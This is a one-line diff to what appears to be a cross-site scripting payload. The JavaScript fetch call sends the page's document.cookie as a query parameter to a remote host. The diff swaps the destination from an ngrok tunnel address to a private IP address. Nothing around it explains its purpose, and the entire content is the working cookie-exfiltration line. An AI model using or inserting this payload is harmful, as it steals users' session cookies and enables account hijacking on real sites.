@@ -1,1 +1,1 @@
-fetch('https://meteorlike-joanne-wheezingly.ngrok-fr?c=' + document.cookie)
+fetch('https://192.168.90.211?c=' + document.cookie)
